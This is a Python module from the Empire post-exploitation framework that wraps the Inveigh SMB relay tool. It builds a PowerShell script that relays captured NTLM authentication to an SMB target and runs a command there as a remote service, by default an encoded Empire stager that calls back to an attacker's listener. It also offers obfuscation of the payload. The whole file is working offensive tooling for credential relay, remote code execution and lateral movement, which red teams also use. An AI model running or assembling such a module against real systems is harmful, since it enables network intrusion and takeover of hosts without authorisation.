from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-InveighRelay',

            'Author': ['Kevin Robertson'],

            'Description': ('Inveigh\'s SMB relay function. This module can be used to relay incoming '
                            'HTTP/Proxy NTLMv1/NTLMv2 authentication requests to an SMB target. If the '
                            'authentication is successfully relayed and the account has the correct '
                            'privilege, a specified command or Empire launcher will be executed on the '
							'target PSExec style. This module works best while also running collection/inveigh '
							'with HTTP disabled. Note that this module exposes only a subset of Inveigh '
							'Relay\'s parameters. Inveigh Relay can be used through Empire\'s scriptimport '
							'and scriptcmd if additional parameters are needed.'),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'https://github.com/Kevin-Robertson/Inveigh'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy_' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Command' : {
                'Description'   :   'Command to execute on relay target. Do not wrap in quotes and use PowerShell escape characters and newlines where necessary.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'ConsoleOutput' : {
                'Description'   :   '(Low/Medium/Y) Default = Y: Enable/Disable real time console output. Medium and Low can be used to reduce output.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'ConsoleStatus' : {
                'Description'   :   'Interval in minutes for displaying all unique captured hashes and credentials. This will display a clean list of captures in Empire.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ConsoleUnique' : {
                'Description'   :   '(Y/N) Default = Y: Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname, and username combinations.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'HTTP' : {
                'Description'   :   '(Y/N) Default = Y: Enable/Disable HTTP challenge/response capture/relay.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Proxy' : {
                'Description'   :   '(Y/N) Default = N: Enable/Disable Inveigh\'s proxy server authentication capture/relay.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ProxyPort' : {
                'Description'   :   'Default = 8492: TCP port for Inveigh\'s proxy listener.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'RunTime' : {
                'Description'   :   'Run time duration in minutes.',
                'Required'      :   True,
                'Value'         :   ''
            },
			'Service' : {
                'Description'   :   'Default = 20 character random: Name of the service to create and delete on the target.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'SMB1' : {
                'Description'   :   '(Switch) Force SMB1.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Target' : {
                'Description'   :   'IP address or hostname of system to target for relay.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Usernames' : {
                'Description'   :   'Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'WPADAuth' : {
                'Description'   :   '(Anonymous/NTLM) HTTP listener authentication type for wpad.dat requests.',
                'Required'      :   False,
                'Value'         :   ''
            }

        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy_']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        command = self.options['Command']['Value']

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-InveighRelay.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        if command == "":
            if not self.mainMenu.listeners.is_listener_valid(listenerName):
                # not a valid listener, return nothing for the script
                print helpers.color("[!] Invalid listener: " + listenerName)
                return ""

            else:

                # generate the PowerShell one-liner with all of the proper options set
                command = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
        # set defaults for Empire
        scriptEnd = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \"%s\"' % (command)

	for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "useragent" and option.lower() != "proxy_" and option.lower() != "proxycreds" and option.lower() != "command":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        if "," in str(values['Value']):
                            quoted = '"' + str(values['Value']).replace(',', '","') + '"'
                            scriptEnd += " -" + str(option) + " " + quoted
                        else:
                            scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
